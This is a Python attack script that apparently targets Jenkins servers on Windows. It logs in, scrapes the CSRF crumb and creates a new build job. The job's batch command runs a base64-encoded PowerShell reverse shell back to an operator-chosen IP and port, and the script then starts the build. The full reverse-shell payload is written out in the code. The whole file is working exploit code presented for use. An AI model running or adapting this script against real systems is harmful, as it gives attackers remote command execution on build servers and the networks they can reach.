from bs4 import BeautifulSoup
import argparse
import base64
import json
import random
import re
import requests
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def parse_args():
	parser = argparse.ArgumentParser(description='Powershell reverse shell from Jenkins on a Windows-based server using batch command')
	parser.add_argument('-w', '--website', type=str, required=True, help='Required. Jenkins website URL')
	parser.add_argument('-wp', '--webport', type=int, help='Jenkins website port (default: 8080)')
	parser.add_argument('-r','--reverse', type=str, required=True, help='Required. IP to receive reverse shell')
	parser.add_argument('-rp','--revport', type=str, required=True, help='Required. Port to receive reverse shell')
	parser.add_argument('-u','--username', type=str, help='Jenkins username (default: anonymous)')
	parser.add_argument('-p','--password', type=str, help='Jenkins password (default: '')')
	parser.add_argument('--local_proxy', action='store_true', help="Enable local proxy (default: {'http': 'http://127.0.0.1:8080'})")
	return parser.parse_args()


def main():
	args = parse_args()
	WEB_URL = args.website if 'http' in args.website else 'http://' + args.website
	WEB_PORT = args.webport if args.webport else 8080
	WEBSITE = str(WEB_URL) + ':' + str(WEB_PORT)
	LOCAL_IP = args.reverse
	LOCAL_PORT = args.revport
	USERNAME = args.username if args.username else "anonymous"
	PASSWORD = args.password if args.password else ""
	PROXIES = {'http': 'http://127.0.0.1:8080'} if args.local_proxy else None


	#Get the first JSESSIONID to perform login authentication
	t = requests.get(WEBSITE + "/script", proxies=PROXIES)
	#Checking connection to Jenkins server
	if t.status_code == 403:
		print("[>] Connecting to Jenkins server", end='', flush=True); [print('.', end='', flush=True) or time.sleep(0.5) for _ in range(5)]; print()
	else:
		print ("[-] Error: Can not connect to Jenkins server. Check URL and port.")
		exit()

	#Baking first cookies
	set_cookies1 = re.search("^(.*?);", (t.headers['Set-Cookie'])).group()
	jsession1 = re.search("JSESSIONID.........",set_cookies1).group()
	node_cookie1 = re.search("node(.*?);",set_cookies1).group()
	cookies1 = {jsession1: node_cookie1}
	#JSESSIONID.de9599e1=node03166kmkfqft11st4rulza2916212.node0;

	#Server information based on response headers
	print ("[+] Server version: " + t.headers['Server'])
	print ("[+] Jenkins version: " + t.headers['X-Jenkins'])
	print ("[+] Hudson version: " + t.headers['X-Hudson'])

	#Post data to send in order to login
	login_data = {
		"j_username": USERNAME,
		"j_password": PASSWORD, 
		"Submit": "Sign in"}

	#Send authentication request
	s = requests.post(WEBSITE + "/j_acegi_security_check", cookies=cookies1, data=login_data, allow_redirects=False, proxies=PROXIES)
	#Checking connection to login portal
	if s.status_code == 302:
		print("[>] Authentication in progress as " + USERNAME, end='', flush=True); [print('.', end='', flush=True) or time.sleep(0.5) for _ in range(5)]; print()
	else:
		print ("[-] Error: Can not connect to Jenkins login portal. Check URL and port.")
		exit()

	#Baking second cookies and checking if credentials work
	set_cookies2 = re.search("^(.*?);", (s.headers['Set-Cookie'])).group()
	jsession2 = re.search("JSESSIONID.........",set_cookies2)
	if jsession2:
		jsession2 = jsession2.group()
		node_cookie2 = re.search("node(.*?);",set_cookies2).group()
		print ("[+] Valid credentials!!! Authentication successful!!!")
	else:
		print("[-] Error: Can not perform authentication, check credentials or permissions...")
		exit()
	cookies2 = {jsession2: node_cookie2}
	#JSESSIONID.de9599e1=node0168z3renghcpo1hhfd1dq9zy47241.node0;

	#Listing all current jobs
	r = requests.get(WEBSITE + "/view/all/newJob", cookies=cookies2, proxies=PROXIES)
	#Checking if user is able to view current jobs
	if r.status_code == 200:
		print("[>] Listing existing jobs and getting Jenkins-Crumb token", end='', flush=True); [print('.', end='', flush=True) or time.sleep(0.5) for _ in range(5)]; print()
	else:
		print ("[-] Error: Can not list current jobs, user does not have the necessary privileges. Check it manually.")

	#Grabbing Jenkins-Crumb from response body
	soup = BeautifulSoup(r.content, "html.parser")
	crumb = soup.find_all('script')[19].text
	jenkins_crumb = re.search("[a-f0-9]{32}",crumb).group()

	#Create a random build name to avoid duplicates
	build_name = "build_" + ''.join(random.choice('0123456789') for i in range(6))

	#New job information and type
	build_data = {
		"name": build_name,
		"mode": "hudson.model.FreeStyleProject",
		"Jenkins-Crumb": jenkins_crumb}

	#Creating a new job
	q = requests.post(WEBSITE + "/view/all/createItem", data=build_data, cookies=cookies2, proxies=PROXIES)
	#Checking if user is able to create new jobs
	if q.status_code == 200:
		print("[>] Creating a new job to spawn our reverse shell", end='', flush=True); [print('.', end='', flush=True) or time.sleep(0.5) for _ in range(5)]; print()
	else:
		print ("[-] Error: Can not create a new job, user does not have the necessary rights. Check it manually.")

	#Encode Powershell reverse shell to base64
	#https://www.revshells.com/PowerShell%20%232?ip=<IP>&port=<PORT>&shell=powershell
	dec_payload = '$client = New-Object System.Net.Sockets.TCPClient("' + LOCAL_IP + '",' + str(LOCAL_PORT) + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
	encode = str(base64.b64encode(bytes(dec_payload, "utf-16-le")), encoding='ascii')
	reverse_shell = "powershell -e " + encode
	#Configuration of the new job to execute payload
	json_config = {
		"builder": {
			"command": reverse_shell,
			"stapler-class": "hudson.tasks.BatchFile",
			"$class": "hudson.tasks.BatchFile"
		},
		"Jenkins-Crumb": jenkins_crumb
	}
	#Encoding configuration data into json format
	job_data = {
		"Jenkins-Crumb": jenkins_crumb,
		"Submit": "Save",
		"json": json.dumps(json_config)
	}

	#Saving job configuration with reverse shell payload
	p = requests.post(WEBSITE + "/job/" + build_name + "/configSubmit", data=job_data, cookies=cookies2, proxies=PROXIES)
	#Checking if the job configuration is correct
	if p.status_code == 200:
		print("[>] Configuring job " + build_name + " with the reverse shell payload", end='', flush=True); [print('.', end='', flush=True) or time.sleep(0.5) for _ in range(5)]; print()
	else:
		print ("[-] Error: Can not configure the new job, user does not have the necessary rights. Check it manually.")

	#Necessary cookies to start the job
	params = {"delay": "0sec"}
	crum_head = {"Jenkins-Crumb": jenkins_crumb}

	#Initializing the job to execute the reverse shell
	o = requests.post(WEBSITE + "/job/" + build_name + "/build", params=params, headers=crum_head, cookies=cookies2, proxies=PROXIES)
	if o.status_code == 201:
		print("[>] Executing the job with the reverse shell, check your listener", end='', flush=True); [print('.', end='', flush=True) or time.sleep(0.5) for _ in range(5)]; print()
	else:
		print ("[-] Error: Can not execute the new job, user does not have the necessary rights. Check it manually.")

	#Finalizing script
	print ("[+] Exploit executed successfully, should receive a Powershell reverse shell. Enjoy :D")


if __name__ == "__main__":
	main()
